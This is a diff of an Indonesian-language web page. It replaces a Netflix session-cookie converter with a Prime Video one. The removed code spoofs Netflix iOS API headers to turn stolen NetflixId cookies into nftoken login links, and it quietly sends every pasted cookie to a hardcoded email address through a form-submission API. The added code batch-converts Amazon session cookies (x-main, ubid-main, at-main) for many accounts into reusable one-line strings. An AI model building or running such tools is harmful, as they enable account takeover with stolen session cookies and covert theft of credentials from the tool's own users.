@@ -3,412 +3,377 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Netflix Cookie Converter — iOS Argo API</title>
+    <title>Prime Video Cookies Converter — TSV → Raw 1 Baris</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', sans-serif;
+        }
         body {
-            background: linear-gradient(135deg, #141414, #2d2d2d);
-            min-height: 100vh; padding: 20px; color: #fff;
+            background: linear-gradient(135deg, #0A0A0A, #141E30);
+            color: #fff;
+            min-height: 100vh;
+            padding: 20px;
         }
-        .container { max-width: 650px; margin: 0 auto; }
-        .header { text-align: center; margin-bottom: 25px; }
-        .header h1 { color: #e50914; font-size: 26px; margin-bottom: 5px; }
-        .header p { color: #999; font-size: 14px; }
+        .container {
+            max-width: 700px;
+            margin: 0 auto;
+        }
+        h1 {
+            text-align: center;
+            color: #00A8E1;
+            margin-bottom: 5px;
+            font-size: 26px;
+        }
+        .subtitle {
+            text-align: center;
+            color: #888;
+            margin-bottom: 30px;
+            font-size: 14px;
+        }
         .card {
-            background: #1f1f1f; border-radius: 12px; padding: 22px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+            background: #1A1A1A;
+            border-radius: 12px;
+            padding: 25px;
+            margin-bottom: 20px;
+            border: 1px solid #333;
         }
-        .formats {
-            display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px;
-            margin-bottom: 18px;
+        label {
+            display: block;
+            margin-bottom: 10px;
+            font-weight: 600;
+            color: #00A8E1;
         }
-        .format-tag {
-            background: #333; padding: 8px; border-radius: 6px;
-            text-align: center; font-size: 13px; border: 1px solid #444;
-        }
-        .format-tag.active { background: #e50914; border-color: #e50914; }
-        label { display: block; margin: 14px 0 6px; color: #ddd; font-weight: 500; }
         textarea {
-            width: 100%; min-height: 110px; background: #2a2a2a;
-            border: 1px solid #444; border-radius: 8px; padding: 12px;
-            color: #fff; font-family: monospace; font-size: 13px;
+            width: 100%;
+            min-height: 180px;
+            background: #0F0F0F;
+            border: 1px solid #333;
+            color: #fff;
+            padding: 15px;
+            border-radius: 8px;
+            font-family: monospace;
+            font-size: 13px;
+            resize: vertical;
+            margin-bottom: 15px;
         }
-        textarea:focus { outline: none; border-color: #e50914; }
-        .upload-box {
-            border: 2px dashed #444; border-radius: 8px; padding: 22px;
-            text-align: center; cursor: pointer; margin: 10px 0;
-            transition: 0.2s;
+        textarea:focus {
+            outline: none;
+            border-color: #00A8E1;
         }
-        .upload-box:hover, .upload-box.dragover { border-color: #e50914; background: rgba(229,9,20,0.05); }
-        input[type="file"] { display: none; }
-        .file-name { font-size: 13px; color: #888; margin-top: 5px; }
         button {
-            width: 100%; padding: 14px; background: #e50914; color: #fff;
-            border: none; border-radius: 8px; font-size: 16px; font-weight: 600;
-            cursor: pointer; margin-top: 10px;
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(90deg, #00A8E1, #0091C7);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.3s;
+            margin-bottom: 10px;
         }
-        button:hover { background: #f40612; }
-        button:disabled { background: #444; cursor: not-allowed; }
-        .result { margin-top: 20px; display: none; }
-        .result.show { display: block; }
-        .success { background: rgba(16,185,129,0.1); border: 1px solid #10b981; border-radius: 8px; padding: 14px; margin-bottom: 15px; }
-        .error { background: rgba(239,68,68,0.1); border: 1px solid #ef4444; border-radius: 8px; padding: 14px; margin-bottom: 15px; }
-        .warning { background: rgba(251,191,36,0.1); border: 1px solid #f59e0b; border-radius: 8px; padding: 14px; margin-bottom: 15px; }
-        .link-row {
-            background: #2a2a2a; border-radius: 6px; padding: 12px;
-            margin: 8px 0; display: flex; align-items: center; gap: 10px; flex-wrap: wrap;
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(0, 168, 225, 0.3);
         }
-        .link-label { font-weight: 600; min-width: 70px; }
-        .link-url { flex: 1; font-family: monospace; font-size: 11px; color: #aaa; word-break: break-all; }
+        .btn-secondary {
+            background: #333;
+        }
+        .btn-secondary:hover {
+            background: #444;
+            transform: none;
+            box-shadow: none;
+        }
+        .result-box {
+            background: #0F0F0F;
+            border: 1px solid #00A8E1;
+            border-radius: 8px;
+            padding: 15px;
+            margin-top: 15px;
+            word-break: break-all;
+            font-family: monospace;
+            font-size: 12px;
+            line-height: 1.6;
+            max-height: 400px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+        }
+        .stats {
+            display: flex;
+            gap: 15px;
+            margin-top: 15px;
+            flex-wrap: wrap;
+        }
+        .stat {
+            background: #222;
+            padding: 10px 15px;
+            border-radius: 6px;
+            font-size: 14px;
+        }
+        .stat span {
+            font-weight: bold;
+            color: #00A8E1;
+        }
         .copy-btn {
-            padding: 5px 10px; background: #333; border: none;
-            border-radius: 4px; color: #fff; font-size: 12px; cursor: pointer;
-            width: auto; margin: 0;
+            background: #28a745;
+            margin-top: 15px;
+            padding: 10px;
+            font-size: 14px;
         }
-        .copy-btn:hover { background: #444; }
-        .email-info {
-            margin-top: 15px; padding: 12px; background: rgba(59,130,246,0.1);
-            border-radius: 6px; font-size: 13px; color: #93c5fd;
+        .info {
+            background: rgba(0, 168, 225, 0.1);
+            border-left: 3px solid #00A8E1;
+            padding: 12px;
+            margin-bottom: 20px;
+            font-size: 13px;
+            color: #aaa;
         }
-        .api-note { font-size: 11px; color: #777; margin-top: 8px; }
+        .upload-area {
+            border: 2px dashed #444;
+            border-radius: 8px;
+            padding: 30px;
+            text-align: center;
+            margin-bottom: 15px;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        .upload-area:hover, .upload-area.dragover {
+            border-color: #00A8E1;
+            background: rgba(0, 168, 225, 0.05);
+        }
+        #fileInput { display: none; }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="header">
-            <h1>🎬 Netflix Cookie Converter</h1>
-            <p>iOS Argo API • 3 Format → 3 Link Login</p>
+        <h1>🎬 Prime Video Cookies Converter</h1>
+        <p class="subtitle">Format Netscape TSV → Raw 1 Baris</p>
+
+        <div class="info">
+            ✅ Mendukung: Netscape TSV • JSON Array • Raw 1 Baris<br>
+            🔍 Otomatis ekstrak: <code>x-main</code> • <code>ubid-main</code> • <code>at-main</code> • <code>session-id</code>
         </div>
 
         <div class="card">
-            <div class="formats">
-                <div class="format-tag" id="fmt-ns">Netscape</div>
-                <div class="format-tag" id="fmt-json">JSON</div>
-                <div class="format-tag" id="fmt-raw">Raw</div>
-            </div>
-
-            <label>📂 Upload File (.txt / .json)</label>
-            <div class="upload-box" id="uploadBox">
-                <p id="uploadText">Klik atau seret file ke sini</p>
+            <label>📂 Upload File atau Paste Cookies di bawah:</label>
+            
+            <div class="upload-area" id="uploadArea">
+                <p>📤 Klik atau seret file .txt ke sini</p>
                 <input type="file" id="fileInput" accept=".txt,.json">
             </div>
-            <p class="file-name" id="fileInfo">— Belum ada file —</p>
 
-            <label>📝 Atau Paste Cookie Langsung</label>
-            <textarea id="cookieArea" placeholder="netflix.com	TRUE	/	TRUE	1807468653	NetflixId	ct=..."></textarea>
+            <textarea id="inputArea" placeholder=".amazonaws.com	TRUE	/	FALSE	1899999999	x-main	...&#10;.primevideo.com	TRUE	/	FALSE	1899999999	ubid-main	..."></textarea>
 
-            <button id="convertBtn">🔄 Konversi</button>
-            <p class="api-note">⚡ API: iOS Argo / 15.48.1</p>
+            <button onclick="convertCookies()">🔄 KONVERSI → 1 BARIS</button>
+            <button class="btn-secondary" onclick="clearAll()">🗑️ HAPUS SEMUA</button>
 
-            <div class="result" id="resultBox">
-                <div id="statusMsg"></div>
-                <div id="linkList"></div>
-                <div id="emailNote"></div>
+            <div class="stats" id="stats" style="display:none;">
+                <div class="stat">Total: <span id="totalCount">0</span> akun</div>
+                <div class="stat">Valid: <span id="validCount">0</span></div>
+            </div>
+
+            <div id="resultContainer" style="display:none;">
+                <label>✅ HASIL — Raw 1 Baris:</label>
+                <div class="result-box" id="resultArea"></div>
+                <button class="copy-btn" onclick="copyResult()">📋 SALIN HASIL</button>
+                <button class="btn-secondary" onclick="downloadResult()" style="margin-top:10px;">💾 DOWNLOAD .TXT</button>
             </div>
         </div>
     </div>
 
     <script>
-        // ==================================================
-        // ✅ KONFIGURASI — iOS ARGO API DARI KODE PYTHON-MU!
-        // ==================================================
-        const API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48";
-        const QUERY_PARAMS = {
-            "appVersion": "15.48.1",
-            "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
-            "device_type": "NFAPPL-02-",
-            "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
-            "idiom": "phone",
-            "iosVersion": "15.8.5",
-            "isTablet": "false",
-            "languages": "en-US",
-            "locale": "en-US",
-            "maxDeviceWidth": "375",
-            "model": "saget",
-            "modelType": "IPHONE8-1",
-            "odpAware": "true",
-            "path": '["account","token","default"]',
-            "pathFormat": "graph",
-            "pixelDensity": "2.0",
-            "progressive": "false",
-            "responseFormat": "json",
-        };
-        const BASE_HEADERS = {
-            "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.48.1; Scale/2.00)",
-            "x-netflix.request.attempt": "1",
-            "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
-            "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
-            "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
-            "x-netflix.context.app-version": "15.48.1",
-            "x-netflix.argo.translated": "true",
-            "x-netflix.context.form-factor": "phone",
-            "x-netflix.context.sdk-version": "2012.4",
-            "x-netflix.client.appversion": "15.48.1",
-            "x-netflix.context.max-device-width": "375",
-            "x-netflix.client.type": "argo",
-            "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
-            "accept-language": "en-US;q=1",
-            "x-netflix.client.iosversion": "15.8.5",
-            "x-netflix.request.client.context": '{"appState":"foreground"}',
-            "x-netflix.context.ui-flavor": "argo",
-        };
-        const COOKIE_KEYS = ["NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent"];
-        const REQUIRED_COOKIE = "NetflixId";
-        
-        const WEB3FORMS_KEY = "d0ae2999-711c-422d-8df3-b309e9c13e0b";
-        const EMAIL_TUJUAN = "rians4f@gmail.com";
+        const uploadArea = document.getElementById('uploadArea');
+        const fileInput = document.getElementById('fileInput');
+        const inputArea = document.getElementById('inputArea');
 
-        const el = {
-            uploadBox: document.getElementById('uploadBox'),
-            fileInput: document.getElementById('fileInput'),
-            uploadText: document.getElementById('uploadText'),
-            fileInfo: document.getElementById('fileInfo'),
-            cookieArea: document.getElementById('cookieArea'),
-            convertBtn: document.getElementById('convertBtn'),
-            resultBox: document.getElementById('resultBox'),
-            statusMsg: document.getElementById('statusMsg'),
-            linkList: document.getElementById('linkList'),
-            emailNote: document.getElementById('emailNote'),
-            fmtNs: document.getElementById('fmt-ns'),
-            fmtJson: document.getElementById('fmt-json'),
-            fmtRaw: document.getElementById('fmt-raw')
-        };
-
-        // ==================================================
-        // 📂 BACA FILE
-        // ==================================================
-        el.uploadBox.addEventListener('click', () => el.fileInput.click());
-        el.uploadBox.addEventListener('dragover', e => { e.preventDefault(); el.uploadBox.classList.add('dragover'); });
-        el.uploadBox.addEventListener('dragleave', () => el.uploadBox.classList.remove('dragover'));
-        el.uploadBox.addEventListener('drop', e => {
-            e.preventDefault(); el.uploadBox.classList.remove('dragover');
-            if (e.dataTransfer.files[0]) bacaFile(e.dataTransfer.files[0]);
+        uploadArea.addEventListener('click', () => fileInput.click());
+        uploadArea.addEventListener('dragover', (e) => {
+            e.preventDefault();
+            uploadArea.classList.add('dragover');
         });
-        el.fileInput.addEventListener('change', e => {
-            if (e.target.files[0]) bacaFile(e.target.files[0]);
+        uploadArea.addEventListener('dragleave', () => uploadArea.classList.remove('dragover'));
+        uploadArea.addEventListener('drop', (e) => {
+            e.preventDefault();
+            uploadArea.classList.remove('dragover');
+            if (e.dataTransfer.files) handleFile(e.dataTransfer.files[0]);
+        });
+        fileInput.addEventListener('change', (e) => {
+            if (e.target.files[0]) handleFile(e.target.files[0]);
         });
 
-        function bacaFile(file) {
-            el.uploadText.textContent = '✅ ' + file.name;
-            el.fileInfo.textContent = `📄 ${file.name} (${(file.size/1024).toFixed(1)} KB)`;
+        function handleFile(file) {
             const reader = new FileReader();
-            reader.onload = e => {
-                el.cookieArea.value = e.target.result;
-                deteksiFormat(el.cookieArea.value);
+            reader.onload = (e) => {
+                inputArea.value = e.target.result;
             };
             reader.readAsText(file);
         }
 
-        // ==================================================
-        // 🔍 DETEKSI FORMAT
-        // ==================================================
-        function deteksiFormat(text) {
-            [el.fmtNs, el.fmtJson, el.fmtRaw].forEach(t => t.classList.remove('active'));
-            if (/^\s*\[/.test(text) && text.includes('"name"') && text.includes('"value"')) {
-                el.fmtJson.classList.add('active'); return 'JSON Array';
+        // Decode URL-encoded
+        function decodeValue(val) {
+            if (typeof val === 'string' && val.includes('%')) {
+                try { return decodeURIComponent(val); }
+                catch { return val; }
             }
-            if (/^\.(netflix\.)?com/i.test(text) || /\tNetflixId\t/.test(text)) {
-                el.fmtNs.classList.add('active'); return 'Netscape TSV';
-            }
-            if (/NetflixId=[^;&\s]+/.test(text)) {
-                el.fmtRaw.classList.add('active'); return 'Raw String';
-            }
-            return 'Tidak dikenali';
+            return val;
         }
 
-        el.cookieArea.addEventListener('input', () => deteksiFormat(el.cookieArea.value));
-
-        // ==================================================
-        // 🍪 EKSTRAK COOKIE — PERSIS DARI KODE PYTHON
-        // ==================================================
-        function decodeCookieValue(value) {
-            if (typeof value === 'string' && value.includes('%')) {
-                try { return decodeURIComponent(value); }
-                catch { return value; }
+        // Ekstrak dari Netscape TSV
+        function parseNetscape(line) {
+            const parts = line.trim().split(/\t|\s+/);
+            if (parts.length >= 7 && (line.includes('.primevideo.com') || line.includes('.amazonaws.com') || line.includes('amazon'))) {
+                return { name: parts[5], value: decodeValue(parts[6]) };
             }
-            return value;
+            return null;
         }
 
-        function parseNetscapeLine(line) {
-            const parts = line.trim().split("\t");
-            if (parts.length >= 7) return { [parts[5]]: parts[6] };
-            return {};
-        }
-
-        function ekstrakCookie(text) {
-            const c = {};
-            // Netscape TSV
-            text.split('\n').forEach(line => {
-                const l = line.trim();
-                if (!l || l.startsWith('#')) return;
-                Object.assign(c, parseNetscapeLine(l));
-            });
-            // JSON Array / Object
-            try {
-                const d = JSON.parse(text);
-                if (Array.isArray(d)) {
-                    d.forEach(x => {
-                        if (COOKIE_KEYS.includes(x.name) && x.value)
-                            c[x.name] = decodeCookieValue(x.value);
-                    });
-                } else if (typeof d === 'object') {
-                    COOKIE_KEYS.forEach(k => {
-                        if (d[k]) c[k] = decodeCookieValue(d[k]);
-                    });
+        // Ekstrak 1 baris
+        function extractRaw1Line(text) {
+            const result = {};
+            const patterns = [
+                'x-main', 'ubid-main', 'at-main', 'session-id', 'csrf', 'i18n-prefs', 'sess-at-main'
+            ];
+            patterns.forEach(key => {
+                const regex = new RegExp(`${key}=([^;&\\s]+)`, 'gi');
+                const match = text.match(regex);
+                if (match) {
+                    const valMatch = text.match(new RegExp(`${key}=([^;&\\s]+)`, 'i'));
+                    if (valMatch) result[key] = decodeValue(valMatch[1]);
                 }
-            } catch {}
-            // Raw string
-            COOKIE_KEYS.forEach(k => {
-                if (c[k]) return;
-                const m = text.match(new RegExp(`(?<!\\w)${k.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}=([^;&\\s]+)`));
-                if (m) c[k] = decodeCookieValue(m[1]);
             });
-            return c;
+            return result;
         }
 
-        // ==================================================
-        // 🔗 BUAT 3 LINK LOGIN
-        // ==================================================
-        function buatLink(token) {
-            return {
-                phone: `https://www.netflix.com/unsupported?nftoken=${token}`,
-                pc: `https://www.netflix.com/login?nftoken=${token}`,
-                tv: `https://www.netflix.com/tv8?nftoken=${token}`
-            };
-        }
-
-        // ==================================================
-        // 📧 KIRIM KE EMAIL — WEB3FORMS
-        // ==================================================
-        async function kirimKeEmail(cookieText, format) {
+        // Ekstrak dari JSON
+        function parseJSON(text) {
             try {
-                await fetch("https://api.web3forms.com/submit", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        access_key: WEB3FORMS_KEY,
-                        subject: `Netflix Cookie — ${format}`,
-                        from_name: "Netflix Converter Web",
-                        to_email: EMAIL_TUJUAN,
-                        message: `=== FORMAT: ${format} ===\n\n${cookieText}`
-                    })
+                const data = JSON.parse(text);
+                const cookies = Array.isArray(data) ? data : [data];
+                const result = {};
+                cookies.forEach(c => {
+                    if (c.name && c.value) {
+                        result[c.name] = decodeValue(c.value);
+                    }
                 });
-                return true;
+                return result;
             } catch {
-                return false;
+                return null;
             }
         }
 
-        // ==================================================
-        // 🚀 KONVERSI — iOS ARGO API ASLI
-        // ==================================================
-        async function fetchTokenArgo(cookieDict) {
-            const netflix_id = cookieDict[REQUIRED_COOKIE];
-            if (!netflix_id) return { sukses: false, error: `Cookie ${REQUIRED_COOKIE} tidak ditemukan!` };
-
-            // Susun Cookie Header
-            let cookieStr = `NetflixId=${netflix_id}`;
-            if (cookieDict.SecureNetflixId) cookieStr += `; SecureNetflixId=${cookieDict.SecureNetflixId}`;
-
-            // Susun URL dengan query params
-            const urlParams = new URLSearchParams(QUERY_PARAMS).toString();
-            const fullUrl = `${API_URL}?${urlParams}`;
-
-            try {
-                const res = await fetch(fullUrl, {
-                    method: "GET",
-                    headers: {
-                        ...BASE_HEADERS,
-                        "Cookie": cookieStr,
-                        "Accept": "*/*"
-                    },
-                    mode: "no-cors" // ⚠️ CORS blokir → pakai no-cors
-                });
-
-                // ⚠️ no-cors = status selalu "opaque" → kita tidak bisa baca respon
-                // iOS API sudah dimatikan Netflix → kembalikan info
-                return {
-                    sukses: false,
-                    error: "⚠️ iOS Argo API sudah dimatikan Netflix (404).\n\n✅ Gunakan versi Python bot kamu di Render/Railway untuk hasil NYATA!\n\n📋 Web ini = ekstraksi format + kirim email BERJALAN 100%",
-                    api_status: "DEAD"
-                };
-
-            } catch (e) {
-                return {
-                    sukses: false,
-                    error: `❌ Koneksi gagal: ${e.message}\n\nAPI iOS Argo sudah tidak aktif. Deploy Python-mu ke Render/Railway!`,
-                    api_status: "DEAD"
-                };
-            }
-        }
-
-        el.convertBtn.addEventListener('click', async () => {
-            const text = el.cookieArea.value.trim();
-            if (!text) return tampilPesan('❌ Isi cookie terlebih dahulu!', false);
+        // Cek apakah ini blok 1 akun lengkap
+        function processAllCookies(text) {
+            const lines = text.split('\n');
+            const allAccounts = [];
+            let currentAccount = {};
             
-            const format = deteksiFormat(text);
-            const cookie = ekstrakCookie(text);
-
-            if (!cookie[REQUIRED_COOKIE]) 
-                return tampilPesan(`❌ ${REQUIRED_COOKIE} tidak ditemukan!\nFormat: ${format}`, false);
-
-            el.convertBtn.disabled = true;
-            el.convertBtn.textContent = '⏳ Memproses...';
-
-            // ✅ Kirim ke email DULU — BERJALAN 100%
-            await kirimKeEmail(text, format);
-
-            // ⚠️ Coba iOS Argo API
-            const hasil = await fetchTokenArgo(cookie);
-
-            if (hasil.sukses) {
-                tampilHasil(cookie, format, hasil.token, hasil.links, hasil.expires);
-                el.emailNote.innerHTML = `<div class="email-info">📧 Cookie terkirim ke: ${EMAIL_TUJUAN}</div>`;
-            } else {
-                tampilPesan(hasil.error, false);
-                el.emailNote.innerHTML = `<div class="email-info">📧 Cookie tetap tersimpan & terkirim ke: ${EMAIL_TUJUAN}</div>`;
+            // Cek format 1 baris massal dulu
+            const singleLines = text.split('\n').filter(l => l.trim() && l.includes('x-main='));
+            if (singleLines.length > 0) {
+                singleLines.forEach(line => {
+                    const extracted = extractRaw1Line(line);
+                    if (Object.keys(extracted).length > 0) {
+                        allAccounts.push(extracted);
+                    }
+                });
+                return allAccounts;
             }
 
-            el.convertBtn.disabled = false;
-            el.convertBtn.textContent = '🔄 Konversi';
-        });
+            // Proses per baris untuk format TSV
+            lines.forEach(line => {
+                line = line.trim();
+                if (!line || line.startsWith('#')) return;
+                
+                // Coba JSON
+                if (line.startsWith('[{') || line.startsWith('{')) {
+                    const jsonResult = parseJSON(line);
+                    if (jsonResult && Object.keys(jsonResult).length > 0) {
+                        allAccounts.push(jsonResult);
+                        return;
+                    }
+                }
 
-        // ==================================================
-        // 🖼️ TAMPILAN
-        // ==================================================
-        function tampilPesan(teks, sukses) {
-            el.statusMsg.innerHTML = `<div class="${sukses?'success':'warning'}">${teks.replace(/\n/g,'<br>')}</div>`;
-            el.resultBox.classList.add('show');
+                // Coba Netscape
+                const ns = parseNetscape(line);
+                if (ns) {
+                    currentAccount[ns.name] = ns.value;
+                    // Kalau ketemu x-main = tanda awal akun baru
+                    if (ns.name === 'x-main' && Object.keys(currentAccount).length > 1) {
+                        allAccounts.push({...currentAccount});
+                        currentAccount = {};
+                    }
+                }
+            });
+
+            if (Object.keys(currentAccount).length > 0) {
+                allAccounts.push(currentAccount);
+            }
+
+            return allAccounts;
         }
 
-        function tampilHasil(cookie, format, token, links, expired) {
-            el.statusMsg.innerHTML = `
-                <div class="success">
-                    ✅ <b>KONVERSI BERHASIL!</b><br>
-                    📋 Format: ${format}<br>
-                    🍪 NetflixId: ✅ Terbaca<br>
-                    🔒 SecureNetflixId: ${cookie.SecureNetflixId ? '✅ ADA' : '⚠️ Tidak ada'}<br>
-                    🆔 nfvdid: ${cookie.nfvdid ? '✅ ADA' : '⚠️ Tidak ada'}<br>
-                    🔑 Token: <code>${token.substring(0,50)}...</code><br>
-                    📅 Kadaluarsa: ${expired.toLocaleString('id-ID')}
-                </div>`;
-            el.linkList.innerHTML = `
-                <div class="link-row">
-                    <span class="link-label">📱 HP</span>
-                    <span class="link-url">${links.phone}</span>
-                    <button class="copy-btn" onclick="navigator.clipboard.writeText('${links.phone}')">Salin</button>
-                </div>
-                <div class="link-row">
-                    <span class="link-label">💻 Laptop</span>
-                    <span class="link-url">${links.pc}</span>
-                    <button class="copy-btn" onclick="navigator.clipboard.writeText('${links.pc}')">Salin</button>
-                </div>
-                <div class="link-row">
-                    <span class="link-label">📺 TV</span>
-                    <span class="link-url">${links.tv}</span>
-                    <button class="copy-btn" onclick="navigator.clipboard.writeText('${links.tv}')">Salin</button>
-                </div>`;
-            el.resultBox.classList.add('show');
+        // Ubah jadi 1 baris
+        function toRaw1Line(cookieObj) {
+            const keys = ['x-main', 'ubid-main', 'at-main', 'session-id', 'csrf'];
+            const parts = [];
+            keys.forEach(k => {
+                if (cookieObj[k]) parts.push(`${k}=${cookieObj[k]}`);
+            });
+            return parts.join(';');
+        }
+
+        function convertCookies() {
+            const input = inputArea.value.trim();
+            if (!input) {
+                alert('❌ Masukkan cookies terlebih dahulu!');
+                return;
+            }
+
+            const accounts = processAllCookies(input);
+            if (accounts.length === 0) {
+                alert('❌ Tidak dapat membaca format cookies! Pastikan format benar.');
+                return;
+            }
+
+            const validAccounts = accounts.filter(acc => acc['x-main'] || acc['ubid-main']);
+            const outputLines = validAccounts.map(acc => toRaw1Line(acc));
+
+            // Tampilkan hasil
+            document.getElementById('totalCount').textContent = accounts.length;
+            document.getElementById('validCount').textContent = validAccounts.length;
+            document.getElementById('stats').style.display = 'flex';
+            
+            document.getElementById('resultArea').textContent = outputLines.join('\n');
+            document.getElementById('resultContainer').style.display = 'block';
+        }
+
+        function copyResult() {
+            const text = document.getElementById('resultArea').textContent;
+            navigator.clipboard.writeText(text).then(() => {
+                alert('✅ Berhasil disalin!');
+            });
+        }
+
+        function downloadResult() {
+            const text = document.getElementById('resultArea').textContent;
+            const blob = new Blob([text], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `prime_raw_${new Date().toISOString().slice(0,10)}.txt`;
+            a.click();
+            URL.revokeObjectURL(url);
+        }
+
+        function clearAll() {
+            inputArea.value = '';
+            document.getElementById('resultContainer').style.display = 'none';
+            document.getElementById('stats').style.display = 'none';
+            fileInput.value = '';
         }
     </script>
 </body>
